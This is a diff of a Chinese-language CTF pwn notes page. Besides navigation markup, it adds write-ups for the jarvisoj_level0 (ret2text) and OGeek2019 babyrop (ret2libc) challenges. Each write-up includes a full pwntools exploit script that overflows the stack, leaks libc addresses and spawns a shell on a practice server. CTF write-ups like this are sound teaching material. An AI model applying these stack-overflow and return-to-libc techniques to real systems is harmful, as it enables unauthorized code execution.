@@ -403,6 +403,46 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#jarvisoj_level0" class="md-nav__link">
+    jarvisoj_level0
+  </a>
+  
+    <nav class="md-nav" aria-label="jarvisoj_level0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ret2text" class="md-nav__link">
+    ret2text
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ogeek2019babyrop" class="md-nav__link">
+    [OGeek2019]babyrop
+  </a>
+  
+    <nav class="md-nav" aria-label="[OGeek2019]babyrop">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#libc-32" class="md-nav__link">
+    libc 32
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -464,7 +504,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../%E6%B9%96%E6%B9%98%E6%9D%AFhxb_pwn/" class="md-nav__link">
+    <a href="../湖湘杯hxb_pwn.md" class="md-nav__link">
       湖湘杯hxb_pwn
     </a>
   </li>
@@ -609,6 +649,46 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#jarvisoj_level0" class="md-nav__link">
+    jarvisoj_level0
+  </a>
+  
+    <nav class="md-nav" aria-label="jarvisoj_level0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ret2text" class="md-nav__link">
+    ret2text
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ogeek2019babyrop" class="md-nav__link">
+    [OGeek2019]babyrop
+  </a>
+  
+    <nav class="md-nav" aria-label="[OGeek2019]babyrop">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#libc-32" class="md-nav__link">
+    libc 32
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -744,6 +824,77 @@ p.interactive()
 </code></pre>
 <p><code>r.recvuntil("Let's guess the number.")</code></p>
 <p><strong>直到程序运行到括号里的字符串时停下</strong></p>
+<h2 id="jarvisoj_level0">jarvisoj_level0</h2>
+<h3 id="ret2text">ret2text</h3>
+<p>ida</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201121200902121.png#pic_center" />
+跟进函数
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201121200920244.png#pic_center" />
+发现一个可以栈溢出的点</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201121200948728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>并且题目给出了/bin/sh</p>
+<p>easy
+exp：</p>
+<pre><code class="language-python">from pwn import *
+p=remote('node3.buuoj.cn',25190)
+payload = 'a'*0x88 + p64(0x400596)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="ogeek2019babyrop">[OGeek2019]babyrop</h2>
+<h3 id="libc-32">libc 32</h3>
+<p>先ida分析</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201122141036592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>从第十行read看出buf是一个随机数，然后作为参数传入了11行的函数中，之后返回值赋值给v2，v2再传入了12行的函数中，我们先看看11行中的函数</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201122141257184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>只有结尾时return v5，同时有一个read可以让我们进行栈溢出，使v5变成我们想要的东西
+我们再看下一个函数</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2020112215131054.png#pic_center" />
+让a1等于127我们就能利用read函数进行漏洞利用</p>
+<p>所以在上一个函数我们要想办法让它返回127</p>
+<p>后头看
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201122141257184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>buf传参给了a1，a1又给了s
+v6为read的返回参数，若有输入，则返回长度
+下面if拿传参进来的那个随机数和我们输入的字符进行比较，若是不相同则直接exit
+所以这里我们可以用\x00来绕过strlen，使v1=0，因为strlen遇到\x00之后就会中断，这样到strncmp的时候就会直接跳过，因为长度为0了
+在read输入\x00之后输入2C-25=7个的16进制的127就完成了栈溢出利用
+exp：</p>
+<pre><code class="language-python"># -*- coding:utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+
+p=remote('node3.buuoj.cn',28017)
+#r=process('./pwn')
+elf=ELF('./pwn')
+write_plt=elf.plt['write']
+read_got=elf.got['read']
+read_plt=elf.plt['read']
+main_addr=0x08048825#elf.symbols['main']
+
+payload0 = '\x00'+'\xff'*7
+p.sendline(payload0)
+
+
+payload = 'a' * (0xe7+4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x8)
+p.recvuntil('Correct\n')
+p.sendline(payload)
+
+read_addr = u32(p.recv(4))
+print(hex(read_addr))
+
+libc_bash = read_addr - 0x0d4350
+sys_addr = libc_bash + 0x03a940
+bin_sh = libc_bash + 0x15902b
+p.sendline(payload0)
+
+getshell = 'a'*(0xe7+4) + p32(sys_addr) + 'aaaa' + p32(bin_sh)
+
+p.recvuntil('Correct\n')
+p.sendline(getshell)
+p.interactive()
+</code></pre>
+<p><a href="https://www.cnblogs.com/gaonuoqi/p/12366595.html">参考</a></p>
                 
               
               
